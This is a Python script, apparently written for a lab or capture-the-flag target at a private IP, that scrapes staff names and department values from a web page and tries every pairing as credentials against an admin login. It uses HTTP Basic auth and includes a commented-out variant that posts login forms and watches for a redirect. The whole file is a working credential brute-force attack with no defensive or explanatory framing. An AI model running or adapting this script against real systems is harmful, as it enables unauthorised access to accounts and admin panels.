from bs4 import BeautifulSoup
import requests
import http.client, urllib.parse
import sys

def getAuthorized(url, username, password):
    r = requests.get(url, auth=(username, password))
    if str(r.status_code) != '401':
        print ("\n[!] Username: " + username + " Password: " + password + " Code: " + str(r.status_code) + "\n")
        sys.exit()


page = requests.get('http://172.16.120.120/')
content = page.content
soup = BeautifulSoup(content, 'html.parser')
all_names = soup.findAll('td', id='name')
all_names_value = []
for i in range(0, len(all_names)):
    all_names_value.append(all_names[i].get_text()) 
all_department = soup.findAll('td', id='department')
all_department_value = []
for i in range(0,len(all_department)):
    all_department_value.append(all_department[i].get_text())






for user in all_names_value:
    for pwd in all_department_value:
        getAuthorized("http://172.16.120.120/admin.php", user, pwd)

    break
'''
for user in all_names_value:
    #user = user.rstrip()
    for pwd in all_department_value:
        #pwd = pwd.rstrip()


        print (user,"-",pwd)
        
        post_parameters = urllib.parse.urlencode({'username': user, 'password': pwd,'Submit': "Submit"})
        headers = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/html,application/xhtml+xml"}
        conn = http.client.HTTPConnection("172.16.120.120",80)
        conn.request("POST", "/admin.php", post_parameters, headers)
        response = conn.getresponse()

        if(response.getheader('location') == "welcome.php"):
            print("Logged with:",user," - ",pwd)
'''
